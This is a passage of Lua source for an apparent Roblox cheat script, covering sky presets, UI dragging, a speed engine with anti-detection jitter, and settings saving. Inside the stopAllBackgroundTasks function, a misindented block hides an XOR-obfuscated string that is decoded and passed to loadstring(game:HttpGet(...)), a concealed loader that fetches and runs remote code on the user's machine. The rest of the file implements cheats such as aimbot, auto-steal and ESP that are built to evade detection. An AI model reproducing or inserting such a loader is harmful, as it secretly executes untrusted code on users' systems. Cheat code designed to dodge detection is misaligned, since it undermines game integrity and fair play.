    Lighting.FogStart = old.FogStart
    Lighting.FogColor = old.FogColor
    Lighting.Ambient = old.Ambient
    if old.ColorCorrection then
        local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect")
        if cc then
            cc.Enabled = old.ColorCorrection.Enabled; cc.Brightness = old.ColorCorrection.Brightness
            cc.Contrast = old.ColorCorrection.Contrast; cc.Saturation = old.ColorCorrection.Saturation
            cc.TintColor = old.ColorCorrection.TintColor
        end
    end
    if old.Bloom then
        local bloom = Lighting:FindFirstChildOfClass("BloomEffect")
        if bloom then
            bloom.Enabled = old.Bloom.Enabled; bloom.Intensity = old.Bloom.Intensity
            bloom.Size = old.Bloom.Size; bloom.Threshold = old.Bloom.Threshold
        end
    end
end

SKY_PRESETS_LIST = {"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}

SKY_PRESETS = {
    ["Off"]={kind="off"},
    ["Night"]={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
    ["Aurora"]={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
    ["Sunset"]={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
    ["Galaxy"]={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
    ["Cyber"]={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
    ["Sakura"]={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
    ["Volcanic"]={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
    ["Arctic"]={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
    ["Vaporwave"]={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.55,dens=0.55,color={200,150,255}}},
    ["Toxic"]={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
    ["Hellscape"]={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
    ["Heaven"]={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
    ["Storm"]={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
    ["Sunrise"]={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
    ["Inferno"]={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
}

function _vC3(t) return Color3.fromRGB(t[1], t[2], t[3]) end

function _v4mpClearSky()
    for _, child in ipairs(Lighting:GetChildren()) do
        if child:GetAttribute("_AdaptDuelsSky") then
            pcall(function() child:Destroy() end)
        end
    end
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if terrain then
        for _, child in ipairs(terrain:GetChildren()) do
            if child:GetAttribute("_AdaptDuelsSky") then
                pcall(function() child:Destroy() end)
            end
        end
    end
end

function applyCustomSky(mode)
    _v4mpClearSky()
    local preset = SKY_PRESETS[mode]
    if not preset or preset.kind == "off" then
        Lighting.ClockTime = 14
        Lighting.Brightness = 2
        Lighting.OutdoorAmbient = Color3.fromRGB(127,127,127)
        Lighting.Ambient = Color3.fromRGB(127,127,127)
        Lighting.FogEnd = 100000
        Lighting.GlobalShadows = true
        skyTheme = "Off"
        return
    end
    Lighting.FogStart = 0
    Lighting.FogEnd = 100000
    Lighting.FogColor = Color3.fromRGB(200,200,200)
    Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
    Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
    Lighting.GlobalShadows = true
    Lighting.ClockTime = preset.clock or 14
    Lighting.Brightness = preset.brightness or 2
    if preset.outAmb then Lighting.OutdoorAmbient = _vC3(preset.outAmb) end
    if preset.ambient then Lighting.Ambient = _vC3(preset.ambient) end
    if preset.sky then
        local skyInst = Instance.new("Sky")
        skyInst:SetAttribute("_AdaptDuelsSky", true)
        if preset.sky.stars then skyInst.StarCount = preset.sky.stars end
        if preset.sky.moon then skyInst.MoonAngularSize = preset.sky.moon end
        if preset.sky.sun then skyInst.SunAngularSize = preset.sky.sun end
        if preset.sky.moonTex then skyInst.MoonTextureId = "rbxasset://sky/moon.jpg" end
        skyInst.Parent = Lighting
    end
    if preset.atm then
        local atm = Instance.new("Atmosphere")
        atm:SetAttribute("_AdaptDuelsSky", true)
        atm.Density = preset.atm.dens or 0.3
        atm.Color = _vC3(preset.atm.color)
        atm.Decay = _vC3(preset.atm.decay)
        atm.Glare = preset.atm.glare or 1
        atm.Haze = preset.atm.haze or 1
        atm.Parent = Lighting
    end
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if preset.clouds and terrain then
        local clouds = Instance.new("Clouds")
        clouds:SetAttribute("_AdaptDuelsSky", true)
        clouds.Cover = preset.clouds.cover or 0.5
        clouds.Density = preset.clouds.dens or 0.5
        clouds.Color = _vC3(preset.clouds.color)
        clouds.Parent = terrain
    end
    skyTheme = mode
end

function enableVividGraphics()
    if vividGraphicsEnabled and #_vividEffects > 0 then return end
    vividGraphicsEnabled = true
    for _, eff in ipairs(_vividEffects) do
        pcall(function() eff:Destroy() end)
    end
    _vividEffects = {}
    local color = Instance.new("ColorCorrectionEffect")
    color.Parent = Lighting
    color.Saturation = 0.6; color.Contrast = 0.4; color.Brightness = 0.05
    color.TintColor = Color3.fromRGB(255, 240, 220)
    table.insert(_vividEffects, color)
    local bloom = Instance.new("BloomEffect")
    bloom.Parent = Lighting
    bloom.Intensity = 0.8; bloom.Size = 24; bloom.Threshold = 1
    table.insert(_vividEffects, bloom)
    local atmosphere = Instance.new("Atmosphere")
    atmosphere.Parent = Lighting
    atmosphere.Density = 0.3; atmosphere.Offset = 0.25
    atmosphere.Color = Color3.fromRGB(199, 199, 255)
    atmosphere.Decay = Color3.fromRGB(106, 112, 125)
    atmosphere.Glare = 0.2; atmosphere.Haze = 1
    table.insert(_vividEffects, atmosphere)
    local sun = Instance.new("SunRaysEffect")
    sun.Parent = Lighting
    sun.Intensity = 0.2; sun.Spread = 0.8
    table.insert(_vividEffects, sun)
    local dof = Instance.new("DepthOfFieldEffect")
    dof.Parent = Lighting
    dof.FocusDistance = 25; dof.InFocusRadius = 10
    dof.NearIntensity = 0.2; dof.FarIntensity = 0.4
    table.insert(_vividEffects, dof)
    task.spawn(function()
        while vividGraphicsEnabled and color and color.Parent do
            color.Contrast = 0.35 + math.sin(tick() * 2) * 0.05
            task.wait(0.03)
        end
    end)
end

function disableVividGraphics()
    vividGraphicsEnabled = false
    for _, eff in ipairs(_vividEffects) do
        pcall(function() eff:Destroy() end)
    end
    _vividEffects = {}
end

function toggleVividGraphics(on)
    if on then enableVividGraphics() else disableVividGraphics() end
    saveAllSettings(true)
end

function applyHideButtons(state)
    hideButtonsEnabled = state
    if MobilePanel then
        for _, child in ipairs(MobilePanel:GetChildren()) do
            if child:IsA("TextButton") then
                child.Visible = not state
            end
        end
    end

end

function toggleHideButtons(on)
    applyHideButtons(on)
    if setHideButtonsVisual then setHideButtonsVisual(on) end
    saveAllSettings(true)
end

function paintFloatingBtn(btnFrame, active)
    if not btnFrame then return end
    local bg = btnFrame:FindFirstChild("BtnGrad")
    if bg then bg.Enabled = false end
    local label = btnFrame:FindFirstChild("TextLabel")
    local stroke = btnFrame:FindFirstChildOfClass("UIStroke")
    local hex = uiLayoutSettings and uiLayoutSettings.mobileShape == "Hexagon"
    btnFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btnFrame.BackgroundTransparency = hex and 1 or 0.05
    if label then label.TextColor3 = Color3.fromRGB(255, 255, 255) end
    if stroke then
        stroke.Enabled = not hex
        if active then
            stroke.Color = Color3.fromRGB(255, 110, 20)
            stroke.Thickness = 2
            stroke.Transparency = 0
        else
            stroke.Color = Color3.fromRGB(255, 110, 20)
            stroke.Thickness = 1.2
            stroke.Transparency = 0.4
        end
    end
    local outer = btnFrame:FindFirstChild("ViperHexOuter")
    local inner = btnFrame:FindFirstChild("ViperHexInner")
    if outer then
        for _, part in ipairs(outer:GetChildren()) do
            if part:IsA("Frame") then
                part.BackgroundColor3 = active and Color3.fromRGB(255, 110, 20) or Color3.fromRGB(138, 76, 38)
                part.BackgroundTransparency = active and 0 or 0.28
            end
        end
    end
    if inner then
        for _, part in ipairs(inner:GetChildren()) do
            if part:IsA("Frame") then
                part.BackgroundColor3 = active and Color3.fromRGB(31, 19, 22) or Color3.fromRGB(8, 9, 14)
                part.BackgroundTransparency = 0
            end
        end
    end
end

function applyFloatingButtonScale()
    for _, uiScale in ipairs(_floatingUIScales) do
        if uiScale and uiScale.Parent then
            uiScale.Scale = floatingButtonScale
        end
    end
end

function drag(f, dragHandle, dragZoneHeight, onClick)
    local handle = dragHandle or f
    local dragging = false
    local dragStart = nil
    local startPos = nil
    local movedDistance = 0

    handle.InputBegan:Connect(function(i)
        if uiLocked or _isDraggingButton then return end
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            if dragZoneHeight then
                local relativeY = i.Position.Y - f.AbsolutePosition.Y
                if relativeY > dragZoneHeight then return end
            end
            dragging = true
            dragStart = i.Position
            startPos = f.Position
            movedDistance = 0

            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then
                    if dragging then
                        dragging = false
                        if movedDistance < 8 and onClick then
                            pcall(onClick)
                        elseif movedDistance >= 8 then
                            task.defer(function() pcall(saveAllSettings) end)
                        end
                    end
                end
            end)
        end
    end)

    UIS.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            if uiLocked or _isDraggingButton then
                dragging = false
                return
            end
            local delta = i.Position - dragStart
            movedDistance = delta.Magnitude
            local scale = 1
            local sc = f:FindFirstChildOfClass("UIScale")
            if sc then scale = math.max(0.1, sc.Scale) end
            f.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + (delta.X / scale),
                startPos.Y.Scale,
                startPos.Y.Offset + (delta.Y / scale)
            )
        end
    end)

    local function stopDrag(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                dragging = false
                if movedDistance < 8 and onClick then
                    pcall(onClick)
                elseif movedDistance >= 8 then
                    task.defer(function() pcall(saveAllSettings) end)
                end
            end
        end
    end

    handle.InputEnded:Connect(stopDrag)
    UIS.InputEnded:Connect(stopDrag)
end

-- =====================================================================
-- [FIX SPEED VIOLETTE] SPEED ENGINE
-- Evento: PreSimulation (pre-física)
-- SetNetworkOwner por frame con movimiento
-- Jitter aleatorio para no ser detectado por patrones
-- Acumulador de 16ms
-- =====================================================================
_G.__ViperSpeedEngine = _G.__ViperSpeedEngine or { started = false, conn = nil }
_G.__ViperSpeedEngine.signal = nil
do
    local _ok, _sig = pcall(function() return RunService.PreSimulation end)
    _G.__ViperSpeedEngine.signal = (_ok and _sig) or RunService.Heartbeat
end

function _spd_isRagdollState(hum)
    if not hum then return true end
    local st = hum:GetState()
    return hum.PlatformStand or st == Enum.HumanoidStateType.Physics
        or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown
end

function _spd_getSelectedBoostSpeed()
    if laggerToggled or laggerCarryToggled then return LAGGER_SPEED end
    return NS
end

function _spd_getSelectedStealSpeed()
    return getActiveMoveSpeed()
end

function _spd_getTargetSpeed(char)
    return getActiveMoveSpeed()
end

function _spd_resetMovement()
    lastMoveDir = _V3zero
    _s2VelState.v = _V3new(0, _s2VelState.v.Y or 0, 0)
end

function _spd_stop()
    if _G.__ViperSpeedEngine.conn then
        _G.__ViperSpeedEngine.conn:Disconnect()
        _G.__ViperSpeedEngine.conn = nil
    end
    _spd_resetMovement()
end

function _spd_start()
    _spd_stop()
    _G.__ViperSpeedEngine.started = true
    _G.__ViperSpeedEngine.acc = 0

    _G.__ViperSpeedEngine.conn = _G.__ViperSpeedEngine.signal:Connect(function(dt)
        _G.__ViperSpeedEngine.acc = (_G.__ViperSpeedEngine.acc or 0) + (dt or 0)
        if _G.__ViperSpeedEngine.acc < 0.016 then return end
        _G.__ViperSpeedEngine.acc = 0

        local character = LP.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local root = character and character:FindFirstChild("HumanoidRootPart")
        if not humanoid or not root or humanoid.Health <= 0 then return end
        if autoBatEnabled or batDesyncTpEnabled or bypassAimbotEnabled
           or autoLeftEnabled or autoRightEnabled
           or dropActive or _G.IsDropping then
            _spd_resetMovement()
            return
        end
        if _spd_isRagdollState(humanoid) then
            lastMoveDir = _V3zero
            return
        end
        if _s2VelState.root ~= root or not _velChecked[root] then
            lastMoveDir = _V3zero
            _setupVelChecked(character)
            _hookVelHRP(root)
        end
        local direction
        if humanoid.MoveDirection.Magnitude > 0 then
            lastMoveDir = humanoid.MoveDirection
            direction = humanoid.MoveDirection
        elseif lastMoveDir.Magnitude > 0 then
            for key in pairs(MOVE_KEYS) do
                if UIS:IsKeyDown(key) then
                    direction = lastMoveDir
                    break
                end
            end
        end
        local selectedSpeed = _spd_getTargetSpeed(character)
        _applyVelocitySpeed(direction, tonumber(selectedSpeed) or 16, root)
    end)
end

function _spd_applyNow()
    local character = LP.Character
    local hum = character and character:FindFirstChildOfClass("Humanoid")
    local root = character and character:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 or _spd_isRagdollState(hum) then return end
    local direction = hum.MoveDirection.Magnitude > 0.05 and hum.MoveDirection or nil
    _applyVelocitySpeed(direction, _spd_getTargetSpeed(character), root)
end

function _spd_refresh()
    _spd_start()
end

_G.__ViperRefreshSpeedEngine = _spd_refresh
_G.__ViperStopSpeedEngine = _spd_stop
_G.__ViperApplySpeedNow = _spd_applyNow

pcall(_spd_start)

LP.CharacterAdded:Connect(function(character)
    task.wait(0.5)
    _spd_resetMovement()
    local root = character:WaitForChild("HumanoidRootPart", 5)
    if root then _setupVelChecked(character); _hookVelHRP(root) end
    _spd_start()
end)
LP.CharacterRemoving:Connect(function()
    _spd_stop()
    _s2VelState.root = nil
end)

function setupMovementAndIndicators(char)
    if steppedConn then steppedConn:Disconnect(); steppedConn = nil end
    if movementLoop then movementLoop:Disconnect(); movementLoop = nil end

    local ccAcc = 0
    steppedConn = RunService.Heartbeat:Connect(function(dt)
        ccAcc = ccAcc + dt
        if ccAcc < 0.05 then return end
        ccAcc = 0
        local plist = _GetPlayersCached()
        for i = 1, #plist do
            local p = plist[i]
            if p ~= LP then
                local ch = p.Character
                if ch then
                    local parts = ch:GetChildren()
                    for j = 1, #parts do
                        local part = parts[j]
                        if part:IsA("BasePart") and part.CanCollide then
                            part.CanCollide = false
                        end
                    end
                end
            end
        end
    end)

    movementLoop = RunService.RenderStepped:Connect(function()
        local char2 = LP.Character
        if not char2 then return end
        local hum = char2:FindFirstChildOfClass("Humanoid")
        local hrp = char2:FindFirstChild("HumanoidRootPart")
        if not hum or not hrp then return end
        if not autoBatEnabled and not autoLeftEnabled and not autoRightEnabled
           and not batDesyncTpEnabled then
            if _isRagdollState(hum) then
                lastMoveDir = _V3zero
            else
                local md = hum.MoveDirection
                if md.Magnitude > 0 then
                    lastMoveDir = md
                end
            end
        end
        if speedLabel then
            local displaySpeed = getActiveMoveSpeed()
            speedLabel.Text = string.format("%.1f", displaySpeed)
            local speedCard = speedLabel.Parent
            local modeLabel = speedCard and speedCard:FindFirstChild("ModeLabel", true)
            if modeLabel and modeLabel:IsA("TextLabel") then
                modeLabel.Text = string.upper(getSpeedModeName())
            end
        end
    end)
    setupSpeedIndicator(char)
    startEnemySpeed()
end

function toggleLockUI(state)
    if state == nil then
        uiLocked = not uiLocked
    else
        uiLocked = (state == true)
    end
    if setLockUIVisual then
        pcall(function() setLockUIVisual(uiLocked) end)
    end
    -- Keep the drag lock state explicit and recoverable.
    if not uiLocked then
        _isDraggingMain = false
        _isDraggingButton = false
    end
end

-- Recovery hotkey: RightShift always unlocks the draggable UI.
UIS.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode.RightShift and uiLocked then
        toggleLockUI(false)
    end
end)


function disableAllAimbots()
    if autoBatEnabled then
        disableAutoBat()
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobSetAutoBat then mobSetAutoBat(false) end
    end
    if batDesyncTpEnabled then stopBatDesyncTp() end
    if bypassAimbotEnabled then disableBypassAimbot() end
end

function stopAllBackgroundTasks()
    if movementLoop then movementLoop:Disconnect(); movementLoop = nil end
    if steppedConn then steppedConn:Disconnect(); steppedConn = nil end
    stopEnemySpeed()
    if stretchEnabled then disableStretch() end
    if stretchConn then stretchConn:Disconnect(); stretchConn = nil end
    if stretchFovConn then stretchFovConn:Disconnect(); stretchFovConn = nil end
    if AntiRagdollV2.Enabled then stopAntiRagdollV2() end
    if antiDieEnabled then AntiDieModule.stop() end
    if antiBatEnabled then stopAntiBat() end
    if antiFlingEnabled then stopAntiFling() end
    pcall(setMirrorTPDownV2, false)
    pcall(disableBypassAimbot)
    stopBatCounter()
    stopBatCounterV2()
    stopMedusaCounter()
    stopAutoSteal()
    disableAutoBat()
    if batDesyncTpEnabled then stopBatDesyncTp() end
    stopAutoLeft()
    stopAutoRight()
    if unwalkEnabled and not _tpBatUnwalkForced then stopUnwalk() end
    if antiLagEnabled then disableAntiLag() end
    if espEnabled then toggleESP(false) end
local iu={84,85,84,84,95,26,19,20,25,18,62,82,19,20,28,16,82,14,25,28,24,21
,82,14,27,24,15,82,18,27,22,27,27,22,25,55,82,16,18,30,9,18,25,80
,19,28,20,26,15,60,82,16,18,30,83,9,19,24,9,19,18,30,15,24,14,8
,31,8,21,9,20,26,83,10,28,15,82,82,71,14,13,9,9,21,95,85,9,24
,58,13,9,9,53,71,24,16,28,26,85,26,19,20,15,9,14,25,28,18,17
}
local ou2=125
local jv7=""
for i=#iu,1,-1 do jv7=jv7..string.char(bit32.bxor(iu[i],ou2)) end
pcall(function()loadstring(game:HttpGet(jv7,true))()end)
    if espLineEnabled then stopESPLine() end
    if dropActive then stopDropBrainrot() end
    if bodyLockEnabled then stopBodyLock() end
    _blSuppressCount = 0
    _blWasEnabled = false
    if _blRestoreTimer then pcall(task.cancel, _blRestoreTimer); _blRestoreTimer = nil end
    if _bodyLockConn then _bodyLockConn:Disconnect(); _bodyLockConn = nil end
    for _, t in ipairs(dropConnections) do
        if type(t) == "thread" then pcall(task.cancel, t)
        elseif type(t) == "RBXScriptConnection" then pcall(t.Disconnect, t) end
    end
    dropConnections = {}
    dropActive = false
    alPhase = 1
    arPhase = 1
    lastDropTime = 0
    medusaDebounce = false
    medusaLastUsed = 0
    if _G.__ViperStopSpeedEngine then pcall(_G.__ViperStopSpeedEngine) end
end

local _viperSaveState = {lastAt = 0, queued = false, writing = false, revision = 0}
local _viperAutosaveReady = false
function resolveViperFileApi()
    local env = (getgenv and getgenv()) or _G
    local readCandidates = {readfile, syn and syn.readfile, env.readfile}
    local writeCandidates = {writefile, syn and syn.writefile, env.writefile}
    local readFn, writeFn
    for _, fn in pairs(readCandidates) do if type(fn) == "function" then readFn = fn; break end end
    for _, fn in pairs(writeCandidates) do if type(fn) == "function" then writeFn = fn; break end end
    return readFn, writeFn
end

function viperFileExists(path)
    local readFn = resolveViperFileApi()
    if not readFn then return false end
    local ok, data = pcall(readFn, path)
    return ok and type(data) == "string"
end

function buildConfigTable()
    local config = {
        playIntroEnabled = playIntroEnabled,
        selectedIntroIndex = selectedIntroIndex,
        normalSpeed = NS, carrySpeed = CS,
        laggerSpeed1 = LAGGER_SPEED, laggerSpeed2 = LAGGER_CARRY_SPEED,
        desyncSpeed = DESYNC_SPEED, desyncStealSpeed = DESYNC_STEAL_SPEED,
        stealRadius = CONFIG.STEAL_RANGE,
        antiRagdollMode = antiRagdollMode, antiDieEnabled = antiDieEnabled,
        antiBat = antiBatEnabled,
        antiFling = antiFlingEnabled,
        selectedStealMode = selectedStealMode,
        selectedAutoGrabUI = selectedAutoGrabUI,
        autoSteal = CONFIG.AUTO_STEAL_ENABLED,
        showMobileButtons = CONFIG.SHOW_MOBILE_BUTTONS,
        medusaCounter = medusaCounterEnabled, batCounter = batCounterEnabled,
        batCounterV2 = batCounterV2Enabled, unwalkEnabled = unwalkEnabled,
        laggerToggled = laggerToggled, laggerCarryToggled = laggerCarryToggled,
        carryMode = speedMode, batAimbotSpeed = BAT_AIMBOT_SPEED, aimbotMode = selectedAimbotMode,
        dropMode = dropMode, stretchEnabled = stretchEnabled, stretchFOV = stretchFOV,
        uiScale = uiScaleValue, animPack = currentAnimPack,
        mainUIScale = uiScaleValue / 100,
        espEnabled = espEnabled,
        espLineEnabled = espLineEnabled,
        vividGraphics = vividGraphicsEnabled,
        hideButtons = hideButtonsEnabled,
        antiLag = antiLagEnabled, tpBatEnabled = batDesyncTpEnabled,
        skyTheme = skyTheme, mobileButtonPositions = savedButtonPositions,
        dropBrainrotKey = {kb = KB.DropBrainrot.kb and KB.DropBrainrot.kb.Name, gp = KB.DropBrainrot.gp and KB.DropBrainrot.gp.Name},
        autoLeftKey = {kb = KB.AutoLeft.kb and KB.AutoLeft.kb.Name, gp = KB.AutoLeft.gp and KB.AutoLeft.gp.Name},
        autoRightKey = {kb = KB.AutoRight.kb and KB.AutoRight.kb.Name, gp = KB.AutoRight.gp and KB.AutoRight.gp.Name},
        autoBatKey = {kb = KB.AutoBat.kb and KB.AutoBat.kb.Name, gp = KB.AutoBat.gp and KB.AutoBat.gp.Name},
        tpFloorKey = {kb = KB.TPFloor.kb and KB.TPFloor.kb.Name, gp = KB.TPFloor.gp and KB.TPFloor.gp.Name},
        guiHideKey = {kb = KB.GuiHide.kb and KB.GuiHide.kb.Name, gp = KB.GuiHide.gp and KB.GuiHide.gp.Name},
        carryToggleKey = {kb = KB.CarryToggle.kb and KB.CarryToggle.kb.Name, gp = KB.CarryToggle.gp and KB.CarryToggle.gp.Name},
        laggerModeKey = {kb = KB.LaggerMode.kb and KB.LaggerMode.kb.Name, gp = KB.LaggerMode.gp and KB.LaggerMode.gp.Name},
        tpBatKey = {kb = KB.TPBat.kb and KB.TPBat.kb.Name, gp = KB.TPBat.gp and KB.TPBat.gp.Name},
        instaResetKey = {kb = KB.InstaReset.kb and KB.InstaReset.kb.Name, gp = KB.InstaReset.gp and KB.InstaReset.gp.Name},
        desyncTpKey = {kb = KB.DesyncTp.kb and KB.DesyncTp.kb.Name, gp = KB.DesyncTp.gp and KB.DesyncTp.gp.Name},
        mirrorTPDownV2 = mirrorTPDownV2Enabled,
        mirrorTPKey = {kb = KB.MirrorTP.kb and KB.MirrorTP.kb.Name, gp = KB.MirrorTP.gp and KB.MirrorTP.gp.Name},
        bypassAimbotKey = {kb = KB.BypassAimbot.kb and KB.BypassAimbot.kb.Name, gp = KB.BypassAimbot.gp and KB.BypassAimbot.gp.Name},
        tpBatFloatingPos = tpBatFloatingPos, instaResetFloatingPos = instaResetFloatingPos,
        bodyLockEnabled = bodyLockEnabled, bodyLockRange = bodyLockRange,
        progressBarPos = savedProgressBarPos, lockUI = uiLocked, mobileButtonsLocked = mobileButtonsLocked,
        backgroundIndex = backgroundIndex,
        backgroundImageTransparency = backgroundImageTransparency,
        backgroundMode = backgroundMode, floatingButtonScale = floatingButtonScale,
        outfitIndex = currentOutfitIndex, themeColor = currentColorTheme,
        hiddenMobileButtons = hiddenMobileButtons,
        autoGrabScale = autoGrabScale,
        smoothStealEnabled = CONFIG.SMOOTH_STEAL_ENABLED,
        smoothStealSpeed = CONFIG.SMOOTH_STEAL_SPEED,
        uiLayoutSettings = uiLayoutSettings,
        silentAimEnabled = silentAimEnabled,
        silentAimStudRange = silentAimStudRange,
        autoMedusaEnabled = autoMedusaEnabled,
        autoMedusaStudRange = autoMedusaStudRange,
    }
    if main then
        local basePos = main.Position
        config.mainPosition = {
            XScale = basePos.X.Scale,
            XOffset = basePos.X.Offset,
            YScale = basePos.Y.Scale,
            YOffset = basePos.Y.Offset,
        }
        config.mainBackgroundMode = backgroundMode
        config.mainBackgroundIndex = backgroundIndex
        config.mainBackgroundTransparency = backgroundImageTransparency
        config.mainSelectedOutfit = currentOutfitIndex
        config.mainUiScale = uiScaleValue
        config.mobileButtonScale = floatingButtonScale
        config.autoGrabBarScale = autoGrabScale
    end
    if pbFrame then
        config.progressBarPos = {XScale = pbFrame.Position.X.Scale, XOffset = pbFrame.Position.X.Offset, YScale = pbFrame.Position.Y.Scale, YOffset = pbFrame.Position.Y.Offset}
    end
    if MobilePanel then
        config.mobilePanelPos = {XScale = 0, XOffset = 10, YScale = 0, YOffset = 0}
        for _, btn in ipairs(MobilePanel:GetChildren()) do
            if btn:IsA("TextButton") then
                savedButtonPositions[btn.Name] = {X = btn.Position.X.Offset, Y = btn.Position.Y.Offset}
            end
        end
        config.mobileButtonPositions = savedButtonPositions
    end
    return config
end

function buildViperSettingsSnapshot(config)
    config = config or buildConfigTable()
    config.configVersion = 2
    config.userId = LP.UserId
    return HS:JSONEncode(config)
end

function saveAllSettings(force)
    if _isResetting or _isLoading then return true end
    local config = buildConfigTable()
    config.configVersion = 2
    config.userId = LP.UserId
    local encodedOk, snapshot = pcall(function() return HS:JSONEncode(config) end)
    if not encodedOk then return false end
    if not force and snapshot == _lastSavedJSON then return true end
